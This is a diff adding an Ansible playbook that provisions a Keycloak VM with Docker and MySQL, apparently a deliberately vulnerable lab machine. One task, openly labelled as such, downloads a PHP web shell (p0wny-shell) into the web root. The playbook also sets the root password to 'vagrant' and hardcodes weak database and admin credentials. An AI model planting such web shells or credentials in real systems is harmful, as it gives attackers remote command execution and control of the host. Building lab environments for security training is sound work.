@@ -1,0 +1,78 @@
+---
+- name: Provision Keycloak VM
+  become: true  # If you need to run tasks with elevated privileges, such as sudo
+  hosts: all
+  gather_facts: true
+
+  tasks:
+    - name: Install mysql client, docker, docker-compose, and pymysql
+      ansible.builtin.apt:
+        # update_cache: true
+        name: "{{ item }}"
+        state: present
+      loop:
+        - docker.io
+        - docker-compose
+        - mysql-client
+        - python3-pymysql
+    - name: Ensure docker daemon is started
+      ansible.builtin.service:
+        name: docker
+        state: started
+    - name: Install php webshell
+      ansible.builtin.get_url:
+        url: https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+        dest: "/var/www/html/website"
+        mode: '0644'
+    - name: Set username and password
+      ansible.builtin.user:
+        name: "{{ item }}"
+        password: "{{ 'vagrant' | password_hash('sha512') }}"
+        append: true
+        groups: "docker"
+      loop: ['root', 'vagrant']
+    - name: Configure msyql database for keycloak
+      community.mysql.mysql_db:
+        login_user: "root"
+        login_password: "Password123!"
+        name: keycloak
+        state: present
+    - name: Get keycloak example realm
+      ansible.builtin.git:
+        repo: https://github.com/strimzi/strimzi-kafka-oauth
+        dest: "/opt/keycloak-realm"
+        version: main
+        single_branch: true
+        depth: 1
+    # https://www.keycloak.org/server/containers
+    # https://www.keycloak.org/getting-started/getting-started-docker
+    - name: Run keycloak docker container
+      community.docker.docker_container:
+        name: keycloak
+        image: "quay.io/keycloak/keycloak:{{ keycloak_version }}"
+        network_mode: host
+        volumes:
+          - "/opt/keycloak-realm/testsuite/docker/keycloak/realms:/opt/keycloak/data/import"
+        # ports:
+        #   - "8080:8080"
+        #   - "8443:8443"
+        command: "start-dev --import-realm"
+        env:
+          KC_DB: "mysql"
+          # KC_DB_URL: "jdbc:mysql://localhost/keycloak_db"
+          KC_DB_USERNAME: "root"
+          KC_DB_PASSWORD: "Password123!"
+          KEYCLOAK_ADMIN: "admin"
+          KEYCLOAK_ADMIN_PASSWORD: "admin"
+          KC_HOSTNAME: "{{ ansible_default_ipv4.address }}"
+          KC_HOSTNAME_PORT: "8080"
+          KC_HOSTNAME_STRICT: "false"
+          KC_HOSTNAME_STRICT_HTTPS: "false"
+          KC_HTTP_ENABLED: "true"
+          KC_PROXY: "edge"
+          # KC_HTTPS_KEY_STORE_FILE: "/opt/keycloak/httpskeystore"
+          # KC_HTTPS_KEY_STORE_PASSWORD: "password"
+        state: started
+    - name: Display IP address
+      ansible.builtin.debug:
+        var: ansible_default_ipv4.address
